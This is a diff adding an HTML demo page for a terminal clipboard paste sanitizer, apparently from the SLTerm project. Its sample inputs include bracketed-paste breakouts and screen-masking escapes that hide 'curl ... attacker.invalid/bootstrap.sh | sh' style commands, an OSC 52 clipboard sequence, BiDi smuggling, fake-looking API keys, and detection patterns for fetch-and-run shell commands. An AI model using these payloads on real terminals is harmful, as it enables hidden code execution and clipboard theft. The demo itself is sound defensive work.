@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>SLTerm Paste-Guard Lab - Interactive Terminal Escape &amp; Pastejacking Sandbox</title>
+  <meta name="description" content="100% client-side terminal pastejacking, bracketed-paste breakout, OSC 52 clipboard hijack, Trojan Source BiDi, and VT100 visual deception sandbox from SLTerm.">
+  <meta property="og:title" content="SLTerm Paste-Guard Lab - Interactive Terminal Security Sandbox">
+  <meta property="og:description" content="Inspect hidden ESC[201~ breakouts, OSC 52 clipboard exfiltration, CSI/CR/BS line-overwrite deception, BiDi overrides, and live credential exposure locally in your browser.">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://salyys1.github.io/SLTerm/">
+  <style>
+    :root {
+      --bg: #0d1117;
+      --panel: #161b22;
+      --panel-alt: #0f141b;
+      --border: #30363d;
+      --text: #e6edf3;
+      --muted: #8b949e;
+      --accent: #00e5cc;
+      --blue: #58a6ff;
+      --green: #3fb950;
+      --warn: #f0883e;
+      --danger: #ff7b72;
+      --purple: #d2a8ff;
+    }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      background: var(--bg);
+      color: var(--text);
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+      line-height: 1.55;
+    }
+    a { color: var(--blue); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+    .wrap { max-width: 1120px; margin: 0 auto; padding: 32px 20px 64px; }
+    .hero {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      gap: 20px;
+      margin-bottom: 24px;
+      flex-wrap: wrap;
+    }
+    h1 { margin: 0 0 8px; font-size: 30px; letter-spacing: -0.02em; }
+    .pill {
+      display: inline-block;
+      font-size: 12px;
+      font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
+      padding: 2px 9px;
+      border-radius: 999px;
+      border: 1px solid rgba(0, 229, 204, 0.45);
+      color: var(--accent);
+      background: rgba(0, 229, 204, 0.08);
+      vertical-align: middle;
+      margin-left: 8px;
+    }
+    .lead { margin: 0 0 14px; color: var(--muted); max-width: 780px; font-size: 15px; }
+    .cta-row { display: flex; gap: 10px; flex-wrap: wrap; }
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 7px 13px;
+      border-radius: 6px;
+      border: 1px solid var(--border);
+      background: var(--panel);
+      color: var(--text);
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+    .btn:hover { border-color: #6e7681; text-decoration: none; }
+    .btn-primary {
+      background: rgba(0, 229, 204, 0.14);
+      border-color: rgba(0, 229, 204, 0.55);
+      color: var(--accent);
+    }
+    .card {
+      background: var(--panel);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 20px;
+      margin-bottom: 20px;
+    }
+    .card-head {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 14px;
+      flex-wrap: wrap;
+    }
+    .card-title { margin: 0; font-size: 17px; }
+    .tag {
+      font-size: 12px;
+      color: var(--green);
+      border: 1px solid rgba(63, 185, 80, 0.4);
+      background: rgba(63, 185, 80, 0.08);
+      padding: 2px 8px;
+      border-radius: 999px;
+      font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
+    }
+    .preset-bar { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 14px; }
+    textarea {
+      width: 100%;
+      min-height: 112px;
+      background: var(--panel-alt);
+      color: var(--text);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 12px;
+      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+      font-size: 13px;
+      resize: vertical;
+    }
+    textarea:focus { outline: none; border-color: var(--blue); }
+    .kpi-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 12px;
+      margin: 16px 0;
+    }
+    .kpi {
+      background: var(--panel-alt);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 12px 14px;
+    }
+    .kpi-label { font-size: 11.5px; text-transform: uppercase; letter-spacing: 0.04em; color: var(--muted); }
+    .kpi-val { font-size: 20px; font-weight: 700; margin-top: 4px; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; }
+    .kpi-sub { font-size: 12px; color: var(--muted); margin-top: 2px; }
+    .split {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+      gap: 14px;
+      margin-top: 14px;
+    }
+    .pane {
+      background: var(--panel-alt);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      overflow: hidden;
+    }
+    .pane-head {
+      padding: 8px 12px;
+      border-bottom: 1px solid var(--border);
+      font-size: 12.5px;
+      font-weight: 600;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      color: var(--muted);
+    }
+    pre {
+      margin: 0;
+      padding: 12px;
+      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+      font-size: 12.5px;
+      white-space: pre-wrap;
+      word-break: break-all;
+      min-height: 92px;
+    }
+    .esc-pill {
+      display: inline-block;
+      padding: 0 5px;
+      margin: 0 1px;
+      border-radius: 4px;
+      font-weight: 700;
+      font-size: 11.5px;
+    }
+    .esc-danger { background: rgba(255, 123, 114, 0.2); color: var(--danger); border: 1px solid rgba(255, 123, 114, 0.45); }
+    .esc-warn { background: rgba(240, 136, 62, 0.2); color: var(--warn); border: 1px solid rgba(240, 136, 62, 0.45); }
+    .esc-purple { background: rgba(210, 168, 255, 0.18); color: var(--purple); border: 1px solid rgba(210, 168, 255, 0.45); }
+    .warn-list { margin-top: 14px; display: flex; flex-direction: column; gap: 8px; }
+    .warn-item {
+      padding: 10px 12px;
+      border-radius: 6px;
+      border: 1px solid var(--border);
+      background: var(--panel-alt);
+      font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
+      font-size: 12.5px;
+    }
+    .warn-item.crit { border-color: rgba(255, 123, 114, 0.5); }
+    .warn-item.adv { border-color: rgba(240, 136, 62, 0.5); }
+    .warn-item.ok { border-color: rgba(63, 185, 80, 0.45); color: var(--green); }
+    footer { margin-top: 28px; color: var(--muted); font-size: 13px; text-align: center; }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="hero">
+      <div>
+        <h1>SLTerm Paste-Guard Lab <span class="pill">Tauri 2 + Go + xterm.js</span></h1>
+        <p class="lead">
+          Interactive client-side sandbox for SLTerm's clipboard paste sanitizer and VT100 visual-deception simulator
+          (<code>frontend/app/view/term/paste-guard.ts</code>). Inspect bracketed-paste breakouts, OSC 52 clipboard hijacking,
+          CSI/CR/BS prompt overwrites, Trojan Source BiDi controls, zero-width tag smuggling, and secret exposure without uploading a single byte.
+        </p>
+        <div class="cta-row">
+          <a class="btn btn-primary" href="https://github.com/SalyyS1/SLTerm">View SLTerm Repository &rarr;</a>
+          <a class="btn" href="https://github.com/SalyyS1/SLTerm/releases">Download Desktop Builds &rarr;</a>
+          <a class="btn" href="https://github.com/SalyyS1/mcp-slim">Companion: mcp-slim &rarr;</a>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-head">
+        <h2 class="card-title">Clipboard Payload &amp; Escape-Sequence Inspector</h2>
+        <span class="tag">100% Local Browser Execution - Zero Network Calls</span>
+      </div>
+
+      <div class="preset-bar">
+        <button type="button" class="btn btn-primary" id="preset-breakout">Preset 1: ESC[201~ Bracketed-Paste Breakout</button>
+        <button type="button" class="btn" id="preset-deception">Preset 2: CSI 2K + CR Visual Prompt Masking</button>
+        <button type="button" class="btn" id="preset-osc52">Preset 3: OSC 52 Clipboard Read/Write Hijack</button>
+        <button type="button" class="btn" id="preset-bidi">Preset 4: Trojan Source BiDi + Zero-Width Smuggling</button>
+        <button type="button" class="btn" id="preset-secrets">Preset 5: Redacted API Key &amp; JWT Exposure</button>
+      </div>
+
+      <textarea id="payload-input" spellcheck="false" aria-label="Clipboard payload input"></textarea>
+
+      <div class="kpi-grid">
+        <div class="kpi">
+          <div class="kpi-label">Verdict</div>
+          <div class="kpi-val" id="kpi-verdict">-</div>
+          <div class="kpi-sub" id="kpi-verdict-sub">-</div>
+        </div>
+        <div class="kpi">
+          <div class="kpi-label">Envelope Sanitization</div>
+          <div class="kpi-val" id="kpi-modified">-</div>
+          <div class="kpi-sub" id="kpi-bytes-diff">-</div>
+        </div>
+        <div class="kpi">
+          <div class="kpi-label">VT100 Visual Deception</div>
+          <div class="kpi-val" id="kpi-deceptive">-</div>
+          <div class="kpi-sub" id="kpi-deceptive-sub">-</div>
+        </div>
+        <div class="kpi">
+          <div class="kpi-label">Warnings Triggered</div>
+          <div class="kpi-val" id="kpi-warns">0</div>
+          <div class="kpi-sub" id="kpi-warn-kinds">None</div>
+        </div>
+      </div>
+
+      <div class="split">
+        <div class="pane">
+          <div class="pane-head">
+            <span>What Terminal Visually Renders (<code>simulateTerminalDisplay</code>)</span>
+            <span id="render-badge">VT100 Line Buffer</span>
+          </div>
+          <pre id="visual-output"></pre>
+        </div>
+        <div class="pane">
+          <div class="pane-head">
+            <span>Annotated Raw Codepoint &amp; Escape Stream</span>
+            <span>Control &amp; Hidden Spans</span>
+          </div>
+          <pre id="annotated-output"></pre>
+        </div>
+      </div>
+
+      <div class="pane" style="margin-top: 14px;">
+        <div class="pane-head">
+          <span>Sanitized Payload Passed to <code>xterm.paste()</code></span>
+          <button type="button" class="btn" style="padding: 3px 9px; font-size: 12px;" id="btn-copy-sanitized">Copy Sanitized</button>
+        </div>
+        <pre id="sanitized-output"></pre>
+      </div>
+
+      <div class="warn-list" id="warnings-box"></div>
+    </div>
+
+    <div class="card">
+      <div class="card-head">
+        <h2 class="card-title">Defense-in-Depth Architecture in SLTerm</h2>
+      </div>
+      <p style="margin: 0; color: var(--muted); font-size: 14px;">
+        SLTerm combines a native <strong>Tauri 2 Rust host</strong>, a concurrent <strong>Go backend</strong> (<code>wavesrv</code>,
+        <code>pkg/agentteams</code>, <code>pkg/aitools</code>, and <code>pkg/secretstore</code> XChaCha20-Poly1305 credential sealing),
+        and an audited <strong>xterm.js</strong> frontend pipeline. Every clipboard paste passes through <code>sanitizeAndAnalyzePaste</code>
+        before reaching the PTY, stripping 7-bit and 8-bit bracketed-paste breakouts, OSC 52 clipboard exfiltration sequences, and DCS/APC
+        control strings while surfacing secret-redacted warnings.
+      </p>
+    </div>
+
+    <footer>
+      Built by <a href="https://github.com/SalyyS1">@SalyyS1</a> &bull; Apache-2.0 License &bull;
+      <a href="https://github.com/SalyyS1/SLTerm">github.com/SalyyS1/SLTerm</a>
+    </footer>
+  </div>
+
+  <script>
+  (function () {
+    "use strict";
+
+    const BRACKETED_PASTE_MARKER_RE = /(?:\x1b\[|\x9b)20[01]~/g;
+    const OSC52_SEQUENCE_RE = /(?:\x1b\]|\x9d)52;[^\x07\x1b\x9c]*(?:\x07|\x1b\\|\x9c|$)/g;
+    const DCS_APC_STRING_RE = /(?:\x1b[PX^_]|[\x90\x98\x9e\x9f])[\s\S]*?(?:\x07|\x1b\\|\x9c|$)/g;
+    const ESCAPE_SMUGGLING_RE = /[\x08\x1b\x7f\x9b\x9d]|\r(?!\n|$)/;
+    const BIDI_CONTROL_RE = /[\u061c\u202a-\u202e\u2066-\u2069]/;
+    const ZERO_WIDTH_SMUGGLING_RE = /(?:[\u200b-\u200f\u2060-\u2064\u{e0000}-\u{e007f}]|(?<=.)\ufeff)/u;
+
+    const OBFUSCATED_EXEC_PATTERNS = [
+      { label: "base64-decode-pipe-shell", regex: /\bbase64\s+(?:-d|--decode)\b[^\n|]*\|\s*(?:ba|z|da|k)?sh\b/i },
+      { label: "network-fetch-pipe-shell", regex: /\b(?:curl|wget)\b[^\n|]*\|\s*(?:sudo\s+)?(?:ba|z|da|k)?sh\b/i },
+      { label: "punycode-domain-command", regex: /\b(?:curl|wget|ssh|scp|git\s+clone)\b[^\n]*\bxn--[a-z0-9-]+/i }
+    ];
+
+    const SECRET_PATTERNS = [
+      { label: "openai-api-key", regex: /\bsk-(?:proj|svcacct)-[A-Za-z0-9_-]{20,}\b/ },
+      { label: "anthropic-api-key", regex: /\bsk-ant-api\d{2}-[A-Za-z0-9_-]{20,}\b/ },
+      { label: "github-token", regex: /\b(?:gh[pousr]_[A-Za-z0-9]{36,}|github_pat_[A-Za-z0-9_]{22,})\b/ },
+      { label: "aws-access-key-id", regex: /\b(?:AKIA|ASIA)[0-9A-Z]{16}\b/ },
+      { label: "google-api-key", regex: /\bAIza[0-9A-Za-z_-]{35}\b/ },
+      { label: "huggingface-token", regex: /\bhf_[A-Za-z0-9]{34,}\b/ },
+      { label: "npm-access-token", regex: /\bnpm_[A-Za-z0-9]{36}\b/ },
+      { label: "slack-token", regex: /\bxox[baprs]-[0-9A-Za-z-]{10,}\b/ },
+      { label: "jwt-bearer-token", regex: /\beyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b/ },
+      { label: "pem-private-key", regex: /-----BEGIN (?:RSA |EC |DSA |OPENSSH |ENCRYPTED )?PRIVATE KEY-----/ }
+    ];
+
+    function simulateTerminalDisplay(input) {
+      if (!input) return "";
+      const lines = [[]];
+      let row = 0, col = 0;
+      const ensureRow = (r) => { while (lines.length <= r) lines.push([]); };
+      let i = 0;
+      while (i < input.length) {
+        const ch = input[i];
+        const code = input.charCodeAt(i);
+        if (ch === "\r") {
+          if (input[i + 1] === "\n") { row++; ensureRow(row); col = 0; i += 2; continue; }
+          col = 0; i++; continue;
+        }
+        if (ch === "\n") { row++; ensureRow(row); col = 0; i++; continue; }
+        if (code === 0x08 || code === 0x7f) { if (col > 0) col--; i++; continue; }
+        if (code === 0x1b || code === 0x9b) {
+          const isCsi = code === 0x9b || input[i + 1] === "[";
+          const isOsc = code === 0x1b && input[i + 1] === "]";
+          if (isCsi) {
+            let j = code === 0x9b ? i + 1 : i + 2;
+            let params = "";
+            while (j < input.length && input.charCodeAt(j) >= 0x20 && input.charCodeAt(j) <= 0x3f) {
+              params += input[j]; j++;
+            }
+            const finalByte = j < input.length ? input[j] : "";
+            const n = Math.max(parseInt(params || "1", 10) || 1, 1);
+            if (finalByte === "K") {
+              const mode = parseInt(params || "0", 10) || 0;
+              const curLine = lines[row];
+              if (mode === 2) lines[row] = [];
+              else if (mode === 1) { for (let k = 0; k <= Math.min(col, curLine.length - 1); k++) curLine[k] = " "; }
+              else curLine.length = Math.min(col, curLine.length);
+            } else if (finalByte === "A") row = Math.max(0, row - n);
+            else if (finalByte === "F") { row = Math.max(0, row - n); col = 0; }
+            else if (finalByte === "G") col = Math.max(0, n - 1);
+            else if (finalByte === "D") col = Math.max(0, col - n);
+            else if (finalByte === "J" && (params === "2" || params === "3")) {
+              lines.length = 1; lines[0] = []; row = 0; col = 0;
+            }
+            i = j < input.length ? j + 1 : j;
+            continue;
+          }
+          if (isOsc) {
+            let j = i + 2;
+            while (j < input.length) {
+              if (input.charCodeAt(j) === 0x07 || input.charCodeAt(j) === 0x9c) { j++; break; }
+              if (input.charCodeAt(j) === 0x1b && input[j + 1] === "\\") { j += 2; break; }
+              j++;
+            }
+            i = j; continue;
+          }
+          i += 2; continue;
+        }
+        if (code === 0xdb40 && i + 1 < input.length) {
+          const lo = input.charCodeAt(i + 1);
+          if (lo >= 0xdc00 && lo <= 0xdc7f) { i += 2; continue; }
+        }
+        if ((code < 0x20 && ch !== "\t") || BIDI_CONTROL_RE.test(ch) || /[\u200b-\u200f\u2060-\u2064\ufeff]/.test(ch)) {
+          i++; continue;
+        }
+        const curLine = lines[row];
+        while (curLine.length < col) curLine.push(" ");
+        curLine[col] = ch;
+        col++;
+        i++;
+      }
+      return lines.map((chars) => chars.join("").replace(/\s+$/g, "")).join("\n");
+    }
+
+    function stripEscapeSequencesPlain(input) {
+      return input
+        .replace(/(?:\x1b\[|\x9b)[\x20-\x3f]*[\x40-\x7e]/g, "")
+        .replace(/(?:\x1b\])[^\x07\x1b\x9c]*(?:\x07|\x1b\\|\x9c|$)/g, "")
+        .replace(/[\x00-\x08\x0b\x0c\x0e-\x1f\x7f\x80-\x9f]/g, "")
+        .replace(/\r(?!\n)/g, "\n");
+    }
+
+    function hasVisualLineDeception(sanitizedText, simulatedDisplay) {
+      if (!ESCAPE_SMUGGLING_RE.test(sanitizedText)) return false;
+      const rawTokens = stripEscapeSequencesPlain(sanitizedText).split(/\s+/).filter((t) => t.length >= 2);
+      for (const tok of rawTokens) {
+        if (!simulatedDisplay.includes(tok)) return true;
+      }
+      return false;
+    }
+
+    function sanitizeAndAnalyzePaste(text) {
+      if (!text) {
+        return { sanitizedText: "", modified: false, simulatedDisplay: "", deceptiveDisplay: false, warnings: [] };
+      }
+      const warnings = [];
+      let strippedBreakout = false, strippedOsc52 = false, strippedDcs = false;
+      let sanitizedText = text.replace(BRACKETED_PASTE_MARKER_RE, () => { strippedBreakout = true; return ""; });
+      sanitizedText = sanitizedText.replace(OSC52_SEQUENCE_RE, () => { strippedOsc52 = true; return ""; });
+      sanitizedText = sanitizedText.replace(DCS_APC_STRING_RE, () => { strippedDcs = true; return ""; });
+      const modified = strippedBreakout || strippedOsc52 || strippedDcs;
+
+      if (strippedBreakout) warnings.push({ kind: "bracketed_paste_breakout", crit: true, summary: "Removed bracketed-paste boundary escape sequence from clipboard payload." });
+      if (strippedOsc52) warnings.push({ kind: "osc52_clipboard_hijack", crit: true, summary: "Removed OSC 52 terminal clipboard read/write escape sequence from clipboard payload." });
+      if (strippedDcs) warnings.push({ kind: "dcs_control_string", crit: true, summary: "Removed DCS/APC/PM/SOS terminal device control string from clipboard payload." });
+
+      const simulatedDisplay = simulateTerminalDisplay(sanitizedText);
+      const deceptiveDisplay = hasVisualLineDeception(sanitizedText, simulatedDisplay);
+
+      if (ESCAPE_SMUGGLING_RE.test(sanitizedText)) warnings.push({ kind: "ansi_escape_smuggling", crit: false, summary: "Clipboard payload contains terminal escape or line-overwrite control characters." });
+      if (deceptiveDisplay) warnings.push({ kind: "visual_line_deception", crit: true, summary: "Terminal line-editing controls conceal executed command tokens from visible prompt output." });
+      if (BIDI_CONTROL_RE.test(sanitizedText)) warnings.push({ kind: "bidi_trojan_source", crit: true, summary: "Clipboard payload contains Unicode bidirectional override or isolate characters." });
+      if (ZERO_WIDTH_SMUGGLING_RE.test(sanitizedText)) warnings.push({ kind: "zero_width_smuggling", crit: false, summary: "Clipboard payload contains invisible zero-width or Plane-14 tag characters." });
+
+      const matchedExec = OBFUSCATED_EXEC_PATTERNS.filter((r) => r.regex.test(sanitizedText)).map((r) => r.label);
+      if (matchedExec.length > 0) warnings.push({ kind: "obfuscated_shell_exec", crit: false, summary: "Clipboard payload matches high-risk shell execution pattern(s): " + matchedExec.join(", ") + "." });
+
+      const matchedSecrets = SECRET_PATTERNS.filter((p) => p.regex.test(sanitizedText)).map((p) => p.label);
+      if (matchedSecrets.length > 0) warnings.push({ kind: "secret_exposure", crit: false, summary: "Clipboard payload matches " + matchedSecrets.length + " credential pattern(s): " + matchedSecrets.join(", ") + "." });
+
+      return { sanitizedText, modified, simulatedDisplay, deceptiveDisplay, warnings };
+    }
+
+    function escapeHtml(s) {
+      return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+    }
+
+    function annotateStream(raw) {
+      let out = "";
+      for (let i = 0; i < raw.length; i++) {
+        const cp = raw.codePointAt(i);
+        const ch = raw[i];
+        if (cp > 0xffff) i++;
+        if (cp === 0x1b) out += "<span class=\"esc-pill esc-danger\">ESC(0x1B)</span>";
+        else if (cp === 0x9b) out += "<span class=\"esc-pill esc-danger\">CSI(0x9B)</span>";
+        else if (cp === 0x9d) out += "<span class=\"esc-pill esc-danger\">OSC(0x9D)</span>";
+        else if (cp === 0x9c) out += "<span class=\"esc-pill esc-danger\">ST(0x9C)</span>";
+        else if (cp === 0x07) out += "<span class=\"esc-pill esc-danger\">BEL(0x07)</span>";
+        else if (cp === 0x08 || cp === 0x7f) out += "<span class=\"esc-pill esc-warn\">BS(0x" + cp.toString(16).toUpperCase().padStart(2, "0") + ")</span>";
+        else if (cp === 0x0d && raw[i + 1] !== "\n") out += "<span class=\"esc-pill esc-warn\">CR(\\r)</span>";
+        else if ((cp >= 0x202a && cp <= 0x202e) || (cp >= 0x2066 && cp <= 0x2069) || cp === 0x061c) {
+          out += "<span class=\"esc-pill esc-danger\">BiDi(U+" + cp.toString(16).toUpperCase().padStart(4, "0") + ")</span>";
+        } else if ((cp >= 0x200b && cp <= 0x200f) || (cp >= 0x2060 && cp <= 0x2064) || cp === 0xfeff || (cp >= 0xe0000 && cp <= 0xe007f)) {
+          out += "<span class=\"esc-pill esc-purple\">ZW(U+" + cp.toString(16).toUpperCase().padStart(4, "0") + ")</span>";
+        } else if (cp < 0x20 && ch !== "\n" && ch !== "\r" && ch !== "\t") {
+          out += "<span class=\"esc-pill esc-warn\">0x" + cp.toString(16).toUpperCase().padStart(2, "0") + "</span>";
+        } else {
+          out += escapeHtml(String.fromCodePoint(cp));
+        }
+      }
+      return out;
+    }
+
+    const inputEl = document.getElementById("payload-input");
+    let latestSanitized = "";
+
+    function refresh() {
+      const raw = inputEl.value;
+      const res = sanitizeAndAnalyzePaste(raw);
+      latestSanitized = res.sanitizedText;
+
+      const verdictEl = document.getElementById("kpi-verdict");
+      if (res.warnings.length === 0) {
+        verdictEl.textContent = "CLEAN";
+        verdictEl.style.color = "#3fb950";
+        document.getElementById("kpi-verdict-sub").textContent = "Safe for bracketed paste";
+      } else if (res.modified || res.deceptiveDisplay) {
+        verdictEl.textContent = res.modified ? "NEUTRALIZED" : "DECEPTIVE";
+        verdictEl.style.color = "#ff7b72";
+        document.getElementById("kpi-verdict-sub").textContent = "Active terminal escape hazard";
+      } else {
+        verdictEl.textContent = "ADVISORY";
+        verdictEl.style.color = "#f0883e";
+        document.getElementById("kpi-verdict-sub").textContent = "Review warnings before execution";
+      }
+
+      document.getElementById("kpi-modified").textContent = res.modified ? "STRIPPED" : "UNCHANGED";
+      document.getElementById("kpi-modified").style.color = res.modified ? "#00e5cc" : "#e6edf3";
+      document.getElementById("kpi-bytes-diff").textContent = raw.length + " -> " + res.sanitizedText.length + " UTF-16 units";
+
+      document.getElementById("kpi-deceptive").textContent = res.deceptiveDisplay ? "MASKED TOKENS" : "FAITHFUL";
+      document.getElementById("kpi-deceptive").style.color = res.deceptiveDisplay ? "#ff7b72" : "#3fb950";
+      document.getElementById("kpi-deceptive-sub").textContent = res.deceptiveDisplay ? "Screen hides real shell input" : "Visible text matches tokens";
+
+      document.getElementById("kpi-warns").textContent = String(res.warnings.length);
+      document.getElementById("kpi-warn-kinds").textContent = res.warnings.map((w) => w.kind).join(", ") || "None";
+
+      document.getElementById("visual-output").textContent = res.simulatedDisplay || "(empty)";
+      document.getElementById("annotated-output").innerHTML = annotateStream(raw) || "(empty)";
+      document.getElementById("sanitized-output").textContent = res.sanitizedText || "(empty)";
+
+      const warnBox = document.getElementById("warnings-box");
+      if (res.warnings.length === 0) {
+        warnBox.innerHTML = "<div class=\"warn-item ok\">[PASS] Zero escape breakouts, visual line overwrites, BiDi overrides, or credential exposures detected.</div>";
+      } else {
+        warnBox.innerHTML = res.warnings.map((w) =>
+          "<div class=\"warn-item " + (w.crit ? "crit" : "adv") + "\"><strong>[" + escapeHtml(w.kind) + "]</strong> " + escapeHtml(w.summary) + "</div>"
+        ).join("");
+      }
+    }
+
+    const PRESETS = {
+      breakout: "git status --short\x1b[201~\ncurl -fsSL https://attacker.invalid/bootstrap.sh | sh\n\x1b[200~# safe comment",
+      deception: "curl -fsSL https://evil.invalid/implant.sh | sh\x1b[2K\rgit diff --stat HEAD~1",
+      osc52: "npm run build\x1b]52;c;?\x07\x9d52;c;ZXhmaWx0cmF0ZWQ=\x9c && echo done",
+      bidi: "ssh deploy@prod\u200b-bastion.internal # role='user\u202e \u2066// check admin\u2069 \u2066'",
+      secrets: "export OPENAI_API_KEY=sk-proj-" + "AbCdEfGhIjKlMnOpQrStUvWxYz0123456789\nexport GITHUB_TOKEN=ghp_" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"
+    };
+
+    document.getElementById("preset-breakout").addEventListener("click", () => { inputEl.value = PRESETS.breakout; refresh(); });
+    document.getElementById("preset-deception").addEventListener("click", () => { inputEl.value = PRESETS.deception; refresh(); });
+    document.getElementById("preset-osc52").addEventListener("click", () => { inputEl.value = PRESETS.osc52; refresh(); });
+    document.getElementById("preset-bidi").addEventListener("click", () => { inputEl.value = PRESETS.bidi; refresh(); });
+    document.getElementById("preset-secrets").addEventListener("click", () => { inputEl.value = PRESETS.secrets; refresh(); });
+    inputEl.addEventListener("input", refresh);
+
+    document.getElementById("btn-copy-sanitized").addEventListener("click", (ev) => {
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(latestSanitized).then(() => {
+          const btn = ev.currentTarget;
+          const prev = btn.textContent;
+          btn.textContent = "Copied!";
+          setTimeout(() => { btn.textContent = prev; }, 1200);
+        });
+      }
+    });
+
+    inputEl.value = PRESETS.breakout;
+    refresh();
+  })();
+  </script>
+</body>
+</html>
